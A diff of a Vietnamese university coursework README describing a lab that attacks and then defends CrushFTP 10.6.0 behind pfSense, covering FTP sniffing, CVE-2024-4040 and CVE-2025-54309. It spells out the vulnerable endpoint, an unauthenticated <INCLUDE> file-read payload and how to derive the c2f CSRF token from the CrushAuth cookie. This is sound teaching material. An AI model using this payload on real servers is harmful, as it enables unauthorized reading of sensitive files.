@@ -1,365 +1,322 @@
-# BÀI TẬP LỚN: AN TOÀN MẠNG (INT1482)
-## ĐỀ TÀI: AN TOÀN DỊCH VỤ TRUYỀN NHẬN TỆP (CRUSHFTP 10.6.0)
+# BÀI TẬP LỚN MÔN AN TOÀN MẠNG (INT1482)
+# ĐỀ TÀI: AN TOÀN DỊCH VỤ TRUYỀN NHẬN TỆP (CRUSHFTP 10.6.0)
 
 <p align="center">
   <b>HỌC VIỆN CÔNG NGHỆ BƯU CHÍNH VIỄN THÔNG (PTIT)</b><br>
   <b>KHOA AN TOÀN THÔNG TIN</b><br>
-  <i>Học phần: An toàn mạng — Lớp: INT1482-20261-02 — Học kỳ 1 (2025 - 2026)</i>
+  <i>Học kỳ 1 — Năm học 2025 - 2026</i>
+</p>
+
+<p align="center">
+  <img src="https://img.shields.io/badge/H%E1%BB%8Dc%20Ph%E1%BA%A7n-An%20To%C3%A0n%20M%E1%BA%A1ng%20(INT1482)-blue.svg" alt="Course Badge">
+  <img src="https://img.shields.io/badge/L%E1%BB%9Bp-INT1482--20261--02-green.svg" alt="Class Badge">
+  <img src="https://img.shields.io/badge/Nh%C3%B3m-05-orange.svg" alt="Group Badge">
+  <img src="https://img.shields.io/badge/M%C3%A1y%20Ch%E1%BB%A7-CrushFTP%2010.6.0-red.svg" alt="Target Server">
+  <img src="https://img.shields.io/badge/T%C6%B0%E1%BB%9Dng%20L%E1%BB%ADa-pfSense%202.7.2-purple.svg" alt="Firewall Badge">
 </p>
 
 ---
 
-### THÔNG TIN NHÓM THỰC HIỆN
-* **Nhóm:** Nhóm 05
+## THÔNG TIN CHUNG VỀ DỰ ÁN
+
+* **Cơ sở đào tạo:** Học viện Công nghệ Bưu chính Viễn thông (Cơ sở Hà Nội)
+* **Khoa phụ trách:** Khoa An toàn Thông tin
+* **Học phần:** An toàn mạng — **Mã học phần:** INT1482
+* **Mã lớp:** INT1482-20261-02
 * **Giảng viên hướng dẫn:** TS. Nguyễn Ngọc Điệp
-* **Thành viên nhóm:**
-  1. **Ngô Quý Trường Giang** — B23DCAT080
-  2. **Trần Quốc Khánh** — B23DCAT150
-  3. **Trần Huy Hoàng** — B23DCAT115
-  4. **Nguyễn Thị Ngọc Anh** — B23DCAT015
-  5. **Đặng Trần Hải Đăng** — B23DCAT036
+* **Nhóm thực hiện (Nhóm 05):**
+
+| STT | Họ và Tên | Mã Sinh Viên | Vai trò & Đóng góp chính trong dự án |
+| :---: | :--- | :---: | :--- |
+| 1 | **Ngô Quý Trường Giang** | **B23DCAT080** | Trưởng nhóm, nghiên cứu bề mặt tấn công, tổng hợp báo cáo và tài liệu |
+| 2 | **Trần Quốc Khánh** | **B23DCAT150** | Nghiên cứu & xây dựng kịch bản khai thác lỗ hổng CVE-2025-54309 |
+| 3 | **Trần Huy Hoàng** | **B23DCAT115** | Thiết kế kiến trúc phân vùng an ninh pfSense, đóng gói Docker Compose & VMware |
+| 4 | **Nguyễn Thị Ngọc Anh** | **B23DCAT015** | Nghiên cứu lý thuyết giao thức FTP/FTPS/SFTP, bắt gói tin & phân tích Wireshark |
+| 5 | **Đặng Trần Hải Đăng** | **B23DCAT036** | Nghiên cứu cơ chế lỗi SSTI & khai thác thực nghiệm lỗ hổng CVE-2024-4040 |
 
 ---
 
-## MỤC LỤC
-1. [Cấu trúc Kho lưu trữ](#1-cấu-trúc-kho-lưu-trữ)
-2. [Mô hình Kiến trúc Lab và Phân vùng Mạng](#2-mô-hình-kiến-trúc-lab-và-phân-vùng-mạng)
-3. [Cơ sở Lý thuyết Phục vụ Kịch bản Demo](#3-cơ-sở-lý-thuyết-phục-vụ-kịch-bản-demo)
-   - 3.1. [Lý thuyết Tấn công Nghe lén (Sniffing) & Cơ chế Mã hóa Kênh truyền](#31-lý-thuyết-tấn-công-nghe-lén-sniffing--cơ-chế-mã-hóa-kênh-truyền)
-   - 3.2. [Lý thuyết Lỗ hổng CVE-2024-4040 (SSTI & VFS Sandbox Escape)](#32-lý-thuyết-lỗ-hổng-cve-2024-4040-ssti--vfs-sandbox-escape)
-   - 3.3. [Lý thuyết Lỗ hổng CVE-2025-54309 (Race Condition AS2 Authentication Bypass)](#33-lý-thuyết-lỗ-hổng-cve-2025-54309-race-condition-as2-authentication-bypass)
-   - 3.4. [Lý thuyết Cơ chế Phòng thủ Tường lửa pfSense & Phân vùng Mạng](#34-lý-thuyết-cơ-chế-phòng-thủ-tường-lửa-pfsense--phân-vùng-mạng)
-4. [Tải Tệp Ảnh Môi trường Thực nghiệm (.tar)](#4-tải-tệp-ảnh-môi-trường-thực-nghiệm-tar)
-5. [Hướng dẫn Khởi chạy Lab Thực nghiệm (Docker & VMware)](#5-hướng-dẫn-khởi-chạy-lab-thực-nghiệm-docker--vmware)
-6. [Kịch bản Thực nghiệm và Demo Đối chiếu (2 Giai đoạn)](#6-kịch-bản-thực-nghiệm-và-demo-đối-chiếu-2-giai-đoạn)
-   - [Giai đoạn 1: Trước khi phòng thủ (Tấn công thành công)](#giai-đoạn-1-khi-chưa-bật-phòng-thủ-tấn-công-thành-công)
-   - [Giai đoạn 2: Kích hoạt phòng thủ pfSense & Mã hóa](#giai-đoạn-2-kích-hoạt-phòng-thủ-pfsense--mã-hóa-chặn-đứng-tấn-công)
-   - [Bảng tổng hợp đối chiếu kết quả](#bảng-tổng-hợp-đối-chiếu-kết-quả-trước-và-sau-phòng-thủ)
-7. [Dọn dẹp Tài nguyên](#7-dọn-dẹp-tài-nguyên)
-8. [Tài liệu Tham khảo](#8-tài-liệu-tham-khảo)
+## MỤC LỤC TỔNG QUAN
+1. [Giới thiệu Khái quát & Bối cảnh Đề tài](#1-giới-thiệu-khái-quát--bối-cảnh-đề-tài)
+2. [Mục tiêu và Phạm vi Nghiên cứu](#2-mục-tiêu-và-phạm-vi-nghiên-cứu)
+3. [Cấu trúc Kho lưu trữ Repository](#3-cấu-trúc-kho-lưu-trữ-repository)
+4. [Mô hình Kiến trúc Phân vùng An ninh Hệ thống](#4-mô-hình-kiến-trúc-phân-vùng-an-ninh-hệ-thống)
+5. [Tóm tắt Kết quả Nghiên cứu & Thực nghiệm Chính](#5-tóm-tắt-kết-quả-nghiên-cứu--thực-nghiệm-chính)
+   - 5.1. [Nghiên cứu Giao thức & Phân tích Nguy cơ Rò rỉ Dữ liệu](#51-nghiên-cứu-giao-thức--phân-tích-nguy-cơ-rò-rỉ-dữ-liệu)
+   - 5.2. [Phân tích & Tái hiện Khai thác 2 Lỗ hổng Trọng yếu (CVE-2024-4040 & CVE-2025-54309)](#52-phân-tích--tái-hiện-khai-thác-2-lỗ-hổng-trọng-yếu-cve-2024-4040--cve-2025-54309)
+   - 5.3. [Giải pháp Phòng thủ Đa tầng & Kết quả Thực nghiệm Đối chiếu](#53-giải-pháp-phòng-thủ-đa-tầng--kết-quả-thực-nghiệm-đối-chiếu)
+6. [Hướng dẫn Khởi chạy Lab Thực nghiệm (Docker & VMware)](#6-hướng-dẫn-khởi-chạy-lab-thực-nghiệm-docker--vmware)
+7. [Kịch bản Demo Thực nghiệm Đối chiếu (2 Giai đoạn)](#7-kịch-bản-demo-thực-nghiệm-đối-chiếu-2-giai-đoạn)
+8. [Bài học Kinh nghiệm & Hướng Phát triển](#8-bài-học-kinh-nghiệm--hướng-phát-triển)
+9. [Tài liệu Tham khảo Chính](#9-tài-liệu-tham-khảo-chính)
 
 ---
 
-## 1. Cấu trúc Kho lưu trữ
+## 1. Giới thiệu Khái quát & Bối cảnh Đề tài
+
+Trong kỷ nguyên chuyển đổi số, **Dịch vụ truyền nhận tệp (File Transfer Services)** là huyết mạch kết nối giữa các chi nhánh, máy chủ dữ liệu và đối tác kinh doanh trong các doanh nghiệp, tổ chức tài chính và cơ quan nhà nước. Mỗi ngày, hàng triệu tệp tin chứa dữ liệu kinh doanh, báo cáo tài chính, chứng từ điện tử và thông tin nhạy cảm của khách hàng được luân chuyển qua hạ tầng mạng.
+
+Tuy nhiên, bức tranh an ninh mạng đối với dịch vụ này đang tồn tại những nguy cơ nghiêm trọng:
+1. **Sự tồn dư của các giao thức truyền thống thiếu an toàn:** Giao thức FTP cổ điển (RFC 959) ra đời từ năm 1985 khi môi trường mạng chưa có các đe dọa an ninh, dẫn đến việc truyền toàn bộ định danh, mật khẩu và nội dung tệp dưới dạng văn bản rõ (*plaintext*), tạo điều kiện cho các cuộc tấn công nghe lén (*Sniffing*) và tấn công xen giữa (*Man-in-the-Middle - MITM*).
+2. **Sự phơi nhiễm từ các phần mềm máy chủ đa giao thức thương mại:** Nhằm đáp ứng nhu cầu quản trị hiện đại, các giải pháp máy chủ như **CrushFTP** (hỗ trợ FTP, FTPS, SFTP, WebDAV, AS2) đã bổ sung giao diện quản trị Web (WebInterface) và các cổng tiếp nhận giao dịch kinh doanh điện tử (AS2). Chính những tiện ích mở rộng này đã làm gia tăng đáng kể bề mặt tấn công tầng ứng dụng.
+3. **Các lỗ hổng nghiêm trọng bùng nổ trong thực tế:**
+   - **CVE-2024-4040 (CVSS 9.8 - Critical):** Lỗ hổng chèn mẫu từ phía máy chủ (Server-Side Template Injection - SSTI) cho phép kẻ tấn công chưa xác thực thoát khỏi phân vùng thư mục ảo (VFS Sandbox Escape) và đọc bất kỳ tệp tin nhạy cảm nào trên hệ điều hành máy chủ.
+   - **CVE-2025-54309:** Lỗ hổng tương tranh thời gian (Race Condition) trong logic xác thực giao thức AS2 qua HTTPS, cho phép đối tượng từ xa vượt qua xác thực để chiếm đoạt phiên quản trị máy chủ.
+
+Nhận thức sâu sắc tính cấp bách trên, **Nhóm 05** đã thực hiện đề tài bài tập lớn nhằm nghiên cứu toàn diện từ cơ sở lý thuyết, phân tích bề mặt tấn công, thực nghiệm khai thác lỗ hổng cho đến xây dựng giải pháp phòng thủ đa tầng bền vững.
+
+---
+
+## 2. Mục tiêu và Phạm vi Nghiên cứu
+
+### Mục tiêu tổng quát
+Khảo sát, phân tích và làm chủ các kỹ thuật bảo đảm an toàn cho dịch vụ truyền nhận tệp trong doanh nghiệp; chứng minh các nguy cơ bảo mật thông qua thực nghiệm tấn công đối chứng; từ đó xây dựng kiến trúc phòng thủ mạng kết hợp giữa **mã hóa kênh truyền** và **phân vùng an ninh bằng tường lửa pfSense**.
+
+### Các mục tiêu cụ thể
+* **Về mặt Lý thuyết:**
+  - Nghiên cứu kiến trúc hai kênh (kênh điều khiển cổng 21 và kênh dữ liệu) cùng cơ chế hoạt động Active Mode / Passive Mode của giao thức FTP.
+  - Phân tích rủi ro của dữ liệu truyền không mã hóa và phân tích chuyên sâu các giải pháp an toàn thay thế (FTPS và SFTP).
+  - Phân tích bề mặt tấn công 3 tầng: Tầng mạng & giao thức, Tầng ứng dụng máy chủ và Tầng cấu hình quyền hạn.
+  - Mổ xẻ chi tiết nguyên nhân gốc rễ (Root Cause) của 2 lỗ hổng an ninh điển hình trên CrushFTP: CVE-2024-4040 và CVE-2025-54309.
+* **Về mặt Thực nghiệm & Kỹ thuật:**
+  - Xây dựng mô hình kiểm thử mạng phân vùng đa tầng chuẩn hóa trên cả 2 nền tảng: **Docker Compose** (tự động hóa cao, chạy offline) và **VMware Workstation** (mô phỏng sát thực tế doanh nghiệp với pfSense 2.7.2).
+  - Tái hiện thành công kịch bản nghe lén bắt dữ liệu văn bản rõ qua Wireshark.
+  - Viết mã khai thác (Exploit Scripts) và thực nghiệm thành công việc đọc tệp cờ bí mật `/var/tmp/nhom05-cve4040.txt` và trích xuất tài khoản quản trị CrushFTP.
+* **Về mặt Phòng thủ & Đánh giá:**
+  - Triển khai dịch vụ truyền tệp an toàn qua SFTP (OpenSSH cổng 22) và FTPS (TLS 1.3).
+  - Thiết lập bộ quy tắc kiểm soát gói tin trạng thái (Stateful Packet Inspection) trên pfSense, cô lập Broadcast Domain và kích hoạt cơ chế chặn đứng khẩn cấp cổng dịch vụ Web 8080.
+  - Xây dựng bảng đối chiếu kết quả thực nghiệm Trước và Sau khi kích hoạt phòng thủ để đánh giá tính hiệu quả.
+
+---
+
+## 3. Cấu trúc Kho lưu trữ Repository
 
 ```
 BTL_ATM/
 │
-├── README.md                                 <-- Tài liệu báo cáo, lý thuyết demo và hướng dẫn thực nghiệm
-├── video_demo/                               <-- Thư mục chứa video ghi lại quá trình demo thực tế
-├── document/                                 <-- Thư mục tài liệu báo cáo (.docx, .pdf)
+├── README.md                                  <-- [TÀI LIỆU NÀY] Cổng thông tin & tổng quan toàn bộ dự án
+├── nhom05_atm_lab_final.tar                   <-- Gói ảnh Docker 3 máy đóng gói sẵn (~434 MB, chạy Offline)
+├── document/                                  <-- Thư mục chứa tài liệu báo cáo nghiệm thu
+├── video_demo/                                <-- Thư mục video ghi lại quá trình thực nghiệm đối chiếu
 │
-├── kich_ban_lab_docker/                      <-- Môi trường thực nghiệm Docker Compose (3 node mạng)
-│   ├── docker-compose.yml                    <-- Cấu hình 3 node: WAN (Attacker) - pfSense - LAN (CrushFTP)
-│   ├── bat_phong_thu.bat / .ps1              <-- Kích hoạt luật tường lửa pfSense DROP cổng 8080
-│   ├── tat_phong_thu.bat / .ps1              <-- Mở lại cổng 8080 để kiểm thử tấn công
-│   ├── README_DOCKER.md                      <-- Hướng dẫn chi tiết vận hành môi trường Docker
-│   │
-│   ├── firewall/                             <-- Router Firewall mô phỏng pfSense (iptables SPI)
-│   │   ├── Dockerfile
-│   │   └── entrypoint.sh                     <-- Cấu hình NAT Port Forwarding & Filter Rules
-│   │
-│   ├── attacker/                             <-- Máy kiểm thử Kali Linux
-│   │   ├── Dockerfile
-│   │   └── exploits/                         <-- Bộ mã nguồn khai thác thực nghiệm
-│   │       ├── read_file_CVE_2024_4040.py    <-- Script khai thác SSTI đọc file cờ bí mật
-│   │       ├── attack_CVE_2025_54309.py      <-- Script khai thác Race Condition chiếm phiên Admin
-│   │       ├── scan_host.py                  <-- Script dò quét cổng và trạng thái dịch vụ
-│   │       └── scan_logs.py                  <-- Script rà soát nhật ký truy vết tấn công
-│   │
-│   └── victim/                               <-- Máy chủ Ubuntu Server chạy CrushFTP 10.6.0
-│       └── Dockerfile
+├── kich_ban_lab_docker/                       <-- Môi trường thực nghiệm tự động hóa bằng Docker Compose
+│   ├── docker-compose.yml                     <-- Cấu hình 3 node mạng: WAN (Attacker) - pfSense - LAN (CrushFTP)
+│   ├── docker-compose.flat.yml                <-- Cấu hình mạng phẳng kiểm chứng tấn công nghe lén FTP
+│   ├── bat_phong_thu.bat / .ps1               <-- Kích hoạt luật tường lửa pfSense DROP cổng 8080
+│   ├── tat_phong_thu.bat / .ps1               <-- Mở lại cổng 8080 để kiểm thử lại tấn công
+│   ├── README_DOCKER.md                       <-- Cẩm nang vận hành chi tiết lab Docker
+│   ├── firewall/                              <-- Router Firewall mô phỏng pfSense (iptables SPI)
+│   ├── attacker/                              <-- Máy kiểm thử Kali Linux (chứa các script exploit)
+│   │   └── exploits/                          <-- Script khai thác CVE-2024-4040, CVE-2025-54309, scan...
+│   └── victim/                                <-- Máy chủ Ubuntu Server chạy CrushFTP 10.6.0
 │
-└── kich_ban_lab_vmware_pfsense/              <-- Môi trường thực nghiệm trên VMware Workstation
-    ├── pfSense_Config_Backup_Nhom05.xml      <-- File backup cấu hình đầy đủ của pfSense 2.7.2
-    └── README_VMWARE_PFSENSE.md              <-- Hướng dẫn cấu hình Virtual Network Editor (VMnet2/VMnet3)
+└── kich_ban_lab_vmware_pfsense/               <-- Môi trường thực nghiệm trên VMware Workstation
+    ├── pfSense_Config_Backup_Nhom05.xml       <-- Tệp sao lưu cấu hình chuẩn của pfSense 2.7.2
+    └── README_VMWARE_PFSENSE.md               <-- Cẩm nang cấu hình VMnet2/VMnet3 trên VMware
 ```
 
 ---
 
-## 2. Mô hình Kiến trúc Lab và Phân vùng Mạng
+## 4. Mô hình Kiến trúc Phân vùng An ninh Hệ thống
 
-Mô hình lab mô phỏng kiến trúc phân vùng an ninh tiêu chuẩn với tường lửa trung tâm pfSense (tương ứng Hình 10 trong báo cáo BTL):
+Hệ thống lab được thiết kế theo đúng kiến trúc phân vùng an ninh mạng đa tầng trong doanh nghiệp, lấy tường lửa **pfSense** làm chốt chặn kiểm soát trung tâm (tương ứng Hình 10 trong Báo cáo BTL):
 
 ```mermaid
 graph TD
-    subgraph WAN ["VÙNG MẠNG NGOÀI (WAN) - Subnet: 10.10.10.0/24"]
-        Attacker["Máy kiểm thử: attacker_kali<br>IP: 10.10.10.50<br>(Công cụ: Exploit Scripts, Nmap, tcpdump)"]
+    subgraph WAN ["VÙNG MẠNG DIỆN RỘNG (WAN) — Subnet: 10.10.10.0/24"]
+        Attacker["Máy kiểm thử: attacker_kali<br>IP: 10.10.10.50/24 | GW: 10.10.10.128<br>Hệ điều hành: Kali Linux<br>Công cụ: Exploit Scripts, Nmap, Wireshark, tcpdump"]
     end
 
-    subgraph FW ["TƯỜNG LỬA TRUNG TÂM: firewall_pfsense"]
-        WAN_IF["Cổng WAN (eth0)<br>IP: 10.10.10.128"]
-        NAT_ENG["Stateful Packet Filtering & NAT Engine<br>- Port Forwarding: 8080, 21, 22<br>- Phòng thủ khẩn cấp: bat_phong_thu.bat (DROP 8080)<br>- Cô lập Broadcast Domain chống Sniffing"]
-        LAN_IF["Cổng LAN (eth1)<br>IP: 10.10.20.1"]
-        WAN_IF --- NAT_ENG --- LAN_IF
+    subgraph FW ["TƯỜNG LỬA CHỐT CHẶN TRUNG TÂM: firewall_pfsense"]
+        WAN_IF["Card mạng WAN (em0 / eth0)<br>IP: 10.10.10.128/24"]
+        CORE_FW["Bộ máy Lọc gói Trạng thái & NAT pfSense<br>• NAT Port Forwarding: 8080 (Web), 21 (FTP), 22 (SSH)<br>• Chế độ Khẩn cấp: Drop toàn bộ gói tin tới cổng 8080<br>• Cắt đứt Broadcast Domain giữa WAN và LAN"]
+        LAN_IF["Card mạng LAN (em1 / eth1)<br>IP: 10.10.20.1/24"]
+        WAN_IF --- CORE_FW --- LAN_IF
     end
 
-    subgraph LAN ["VÙNG MẠNG NỘI BỘ (LAN) - Subnet: 10.10.20.0/24"]
-        Victim["Máy chủ dịch vụ: victim_server<br>IP: 10.10.20.20<br>Dịch vụ: CrushFTP 10.6.0 (Web: 8080, FTP/FTPS: 21, SFTP: 22)"]
+    subgraph LAN ["VÙNG MẠNG NỘI BỘ (LAN) — Subnet: 10.10.20.0/24"]
+        Victim["Máy chủ dịch vụ: victim_server<br>IP: 10.10.20.20/24 | GW: 10.10.20.1<br>Hệ điều hành: Ubuntu Server 24.04 LTS<br>Dịch vụ: CrushFTP 10.6.0 (Web: 8080, FTP/FTPS: 21, SFTP: 22)<br>Tệp cờ bí mật: /var/tmp/nhom05-cve4040.txt"]
     end
 
-    Attacker ===|Truy cập qua WAN| WAN_IF
-    LAN_IF ===|Chuyển tiếp lưu lượng được phép| Victim
+    Attacker ===|Gửi lưu lượng tấn công qua WAN| WAN_IF
+    LAN_IF ===|Chuyển tiếp lưu lượng hợp lệ được duyệt| Victim
 ```
 
-### Bảng phân bổ thông số mạng trong Lab
+### Bảng Quy hoạch Tham số Mạng & Vai trò Các Node
 
-| Thực thể mạng | Tên Container / VM | Card mạng | Địa chỉ IP gán | Default Gateway | Dịch vụ đảm nhiệm |
-| :--- | :--- | :--- | :--- | :--- | :--- |
-| **Máy kiểm thử** | `attacker_kali` | `eth0` / WAN | `10.10.10.50/24` | `10.10.10.128` | Chạy script khai thác lỗ hổng & công cụ kiểm thử |
-| **Tường lửa pfSense** | `firewall_pfsense` | `eth0` (WAN)<br>`eth1` (LAN) | `10.10.10.128/24`<br>`10.10.20.1/24` | *Host External* | Router định tuyến, NAT Port Forward, Lọc gói tin |
-| **Máy chủ CrushFTP** | `victim_server` | `eth0` / LAN | `10.10.20.20/24` | `10.10.20.1` | Máy chủ CrushFTP 10.6.0 (Web: 8080, FTP: 21, SSH: 22) |
+| Tên Node | Card Mạng | Địa chỉ IP Gán | Default Gateway | Chức năng & Vai trò trong Dự án |
+| :--- | :--- | :--- | :--- | :--- |
+| **`attacker_kali`** | Card WAN | `10.10.10.50/24` | `10.10.10.128` | Đóng vai kẻ tấn công ngoài Internet / đối tác chưa được định danh; thực thi các script khai thác lỗ hổng và rà soát lưu lượng mạng. |
+| **`firewall_pfsense`** | Card WAN<br>Card LAN | `10.10.10.128/24`<br>`10.10.20.1/24` | *Host Gateway* | Router biên trung tâm, thực hiện kiểm soát truy cập (Stateful Firewall), ánh xạ cổng (NAT Port Forwarding) và cô lập hoàn toàn Broadcast Domain giữa 2 phân đoạn mạng. |
+| **`victim_server`** | Card LAN | `10.10.20.20/24` | `10.10.20.1` | Máy chủ nội bộ lưu trữ dữ liệu tệp tin doanh nghiệp, triển khai CrushFTP 10.6.0 cung cấp giao diện Web quản trị, dịch vụ FTP, FTPS và SFTP. |
 
 ---
 
-## 3. Cơ sở Lý thuyết Phục vụ Kịch bản Demo
+## 5. Tóm tắt Kết quả Nghiên cứu & Thực nghiệm Chính
 
-Phần này tập trung phân tích bản chất lý thuyết trực tiếp phục vụ các bài thực nghiệm trong kịch bản demo:
+### 5.1. Nghiên cứu Giao thức & Phân tích Nguy cơ Rò rỉ Dữ liệu
 
-### 3.1. Lý thuyết Tấn công Nghe lén (Sniffing) & Cơ chế Mã hóa Kênh truyền
+Dự án đã tiến hành đối chiếu và kiểm chứng thực tế giữa 3 giao thức truyền nhận tệp phổ biến nhất:
 
-#### A. Tại sao bắt được tài khoản và tệp tin qua FTP truyền thống?
-* **Bản chất kỹ thuật:** FTP truyền thống (RFC 959) truyền tải toàn bộ dữ liệu trên cả kênh điều khiển (TCP 21) lẫn kênh dữ liệu dưới dạng **văn bản rõ (Plaintext)**, hoàn toàn không có lớp mật mã bảo vệ.
-* **Cơ chế thu thập:** Kẻ tấn công cùng nằm trên đường truyền (hoặc sử dụng kỹ thuật ARP Poisoning để biến máy mình thành gateway trung chuyển) chỉ cần đặt card mạng ở chế độ hỗn tạp (*promiscuous mode*) và dùng công cụ như **Wireshark** hoặc `tcpdump` là có thể:
-  1. Đọc trực tiếp lệnh `USER <username>` và `PASS <password>`.
-  2. Sử dụng tính năng **Follow TCP Stream** để trích xuất nguyên vẹn khối dữ liệu nhị phân hoặc văn bản của tệp tin (`mau.txt`) đang truyền qua mạng.
+| Tiêu chí So sánh | FTP truyền thống (RFC 959) | FTPS (RFC 4217) | SFTP (RFC 4253 / SSH) |
+| :--- | :--- | :--- | :--- |
+| **Kênh điều khiển** | ❌ Plaintext (Văn bản rõ) | ✔️ Mã hóa TLS 1.3 | ✔️ Mã hóa đường hầm SSH |
+| **Kênh dữ liệu** | ❌ Plaintext (Văn bản rõ) | ✔️ Mã hóa TLS (`PROT P`) | ✔️ Mã hóa gói tin nhị phân |
+| **Bảo vệ Mật khẩu** | ❌ Hiển thị trực tiếp (`PASS admin123`) | ✔️ Bảo mật tuyệt đối | ✔️ Bảo vệ qua Mật khẩu hoặc Khóa SSH |
+| **Số lượng cổng** | 2 kết nối (Cổng 21 + Cổng dữ liệu động) | 2 kết nối (Cổng 21/990 + Dải Passive) | **1 cổng duy nhất (TCP 22)** |
+| **Khả năng vượt NAT/FW** | Kém, dễ bị chặn kênh dữ liệu ở Active Mode | Trung bình, đòi hỏi mở dải cổng Passive | **Xuất sắc, cấu hình cực kỳ đơn giản** |
+| **Tính toàn vẹn dữ liệu** | ❌ Hoàn toàn không có | ✔️ Kiểm soát bằng HMAC qua TLS | ✔️ Kiểm soát bằng HMAC qua SSH |
 
-#### B. Cơ chế phòng vệ bằng FTPS và SFTP:
-* **FTPS (RFC 4217):** Tích hợp lớp mã hóa **TLS (Transport Layer Security)** bọc ngoài luồng TCP. Kênh điều khiển dùng `AUTH TLS` và kênh dữ liệu dùng `PROT P`. Toàn bộ dữ liệu truyền tải đều bị xáo trộn bởi các thuật toán mã hóa đối xứng (AES-GCM / ChaCha20).
-* **SFTP (RFC 4253):** Sử dụng giao thức **SSHv2 trên cổng TCP 22 duy nhất**. Mọi thông điệp đều được mã hóa đối xứng và có mã kiểm tra tính toàn vẹn **HMAC**. Kẻ nghe lén chỉ thu được các khối dữ liệu nhị phân ngẫu nhiên (`Encrypted packet data`), hoàn toàn không thể phục hồi mật khẩu hay nội dung tệp.
-
----
-
-### 3.2. Lý thuyết Lỗ hổng CVE-2024-4040 (SSTI & VFS Sandbox Escape)
-
-| Thuộc tính | Chi tiết kỹ thuật |
-| :--- | :--- |
-| **Mã định danh** | **CVE-2024-4040** |
-| **Loại lỗ hổng** | Server-Side Template Injection (SSTI) $\rightarrow$ VFS Sandbox Escape $\rightarrow$ Arbitrary File Read / RCE |
-| **Phần mềm ảnh hưởng** | CrushFTP v10 (< 10.7.1) và v11 (< 11.1.0) |
-| **Điểm CVSS v3.1** | **9.8 / 10.0 (CRITICAL)** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
-| **Yêu cầu xác thực** | **Hoàn toàn KHÔNG CẦN (Unauthenticated)** |
-
-#### A. Cơ chế phát sinh lỗ hổng trong mã nguồn
-CrushFTP tích hợp một bộ máy xử lý mẫu nội bộ (Template Engine) để nhúng dữ liệu động vào phản hồi XML thông qua cú pháp thẻ đặc biệt:
-```xml
-<INCLUDE>/duong/dan/tep/tren/he/dieu/hanh</INCLUDE>
-```
-Khi parser của CrushFTP phát hiện thẻ này, engine sẽ truy cập trực tiếp vào hệ thống tệp tin của hệ điều hành máy chủ, đọc toàn bộ nội dung tệp tại đường dẫn chỉ định và thay thế vào chuỗi phản hồi XML trả về client.
-
-#### B. Điểm phát sinh (Vulnerable Endpoint & Parameter)
-Lỗ hổng nằm tại API tiếp nhận lệnh của WebInterface:
-```http
-POST /WebInterface/function/ HTTP/1.1
-Host: 10.10.10.128:8080
-Content-Type: application/x-www-form-urlencoded
-```
-Khi gửi lệnh kiểm tra sự tồn tại của tệp `command=exists`, tham số `paths` được truyền vào. Nhà phát triển **không lọc hoặc khử khuẩn (unsanitized input)** thẻ `<INCLUDE>` trước khi chuyển vào engine:
-```
-command=exists&paths=<INCLUDE>/var/tmp/nhom05-cve4040.txt</INCLUDE>&c2f=XXXX
-```
-Máy chủ đọc trực tiếp tệp `/var/tmp/nhom05-cve4040.txt` trên OS và trả về trọn vẹn nội dung cờ bí mật `NHOM05-CVE4040-LAB-ONLY` trong thẻ `<response>`. Kẻ tấn công thoát khỏi phạm vi thư mục ảo VFS (*VFS Sandbox Escape*) mà không cần tài khoản đăng nhập.
-
-#### C. Lỗ hổng thiết kế token CSRF (`c2f`)
-CrushFTP thiết kế mã chống giả mạo request (`c2f`) bằng cách lấy **4 ký tự cuối cùng của chuỗi cookie `CrushAuth`**:
-```
-CrushAuth = "1755657772315_Nr7FSH4jd2l6RueteEaaEDpY1CcdUF2cY"
-                                                          ^^^^
-                                                   c2f = "F2cY"
-```
-Khi client gửi request nặc danh đầu tiên, máy chủ tự cấp một cookie `CrushAuth`. Script tấn công chỉ cần trích xuất 4 ký tự cuối gán vào `c2f`, vô hiệu hóa hoàn toàn cơ chế kiểm tra CSRF mà không cần biết bất kỳ mật khẩu nào.
+> **Thực nghiệm Wireshark đối chứng:** Khi bắt gói tin FTP trên môi trường mạng phẳng, công cụ Wireshark thông qua tính năng *Follow TCP Stream* đã tái tạo lại toàn bộ tài khoản đăng nhập `crushadmin` và nội dung tệp tin văn bản `mau.txt`. Ngược lại, khi chuyển sang SFTP/FTPS, toàn bộ nội dung chỉ là chuỗi byte nhị phân ngẫu nhiên được mã hóa mạnh mẽ.
 
 ---
 
-### 3.3. Lý thuyết Lỗ hổng CVE-2025-54309 (Race Condition AS2 Authentication Bypass)
+### 5.2. Phân tích & Tái hiện Khai thác 2 Lỗ hổng Trọng yếu (CVE-2024-4040 & CVE-2025-54309)
 
-| Thuộc tính | Chi tiết kỹ thuật |
-| :--- | :--- |
-| **Mã định danh** | **CVE-2025-54309** |
-| **Loại lỗ hổng** | Race Condition Authentication Bypass $\rightarrow$ Session Hijacking / Privilege Escalation |
-| **Phần mềm ảnh hưởng** | CrushFTP 10 (< 10.8.5) khi cấu hình thiếu tầng DMZ Proxy |
-| **Giao thức liên quan** | AS2 (Applicability Statement 2) qua giao thức HTTPS |
+Nhóm đã nghiên cứu sâu vào mã nguồn và cấu trúc API của CrushFTP để giải thích bản chất kỹ thuật của 2 lỗ hổng an ninh:
 
-#### Cơ chế phát sinh:
-Giao thức AS2 được dùng để trao đổi dữ liệu thương mại điện tử qua HTTPS. Khi tiếp nhận các yêu cầu xác thực phiên AS2, bộ xử lý của CrushFTP xuất hiện **điều kiện tương tranh (Race Condition)** trong logic đồng bộ hóa phiên làm việc (*Session Context Binding*).
+#### 1. Lỗ hổng CVE-2024-4040 (SSTI & VFS Sandbox Escape — CVSS 9.8 Critical)
+* **Nguyên nhân gốc rễ:** Engine xử lý mẫu nội bộ của CrushFTP hỗ trợ cú pháp thẻ đặc biệt `<INCLUDE>/duong/dan/tep</INCLUDE>`. Khi gặp thẻ này, máy chủ tự động truy cập trực tiếp vào hệ thống tệp của OS và nhúng nội dung tệp vào phản hồi XML trả về.
+* **Cơ chế lỗi:** Tại endpoint `/WebInterface/function/` với lệnh `command=exists`, tham số `paths` hoàn toàn **không được lọc/khử khuẩn** đối với thẻ `<INCLUDE>`.
+* **Điểm yếu CSRF `c2f`:** Token chống CSRF `c2f` được CrushFTP lấy trực tiếp từ **4 ký tự cuối của cookie `CrushAuth`** mà server tự cấp cho phiên ẩn danh. Kẻ tấn công không cần đăng nhập vẫn tự tính được token hợp lệ.
+* **Kết quả khai thác:** Kẻ tấn công gửi request với payload:
+  `command=exists&paths=<INCLUDE>/var/tmp/nhom05-cve4040.txt</INCLUDE>&c2f=xxxx`
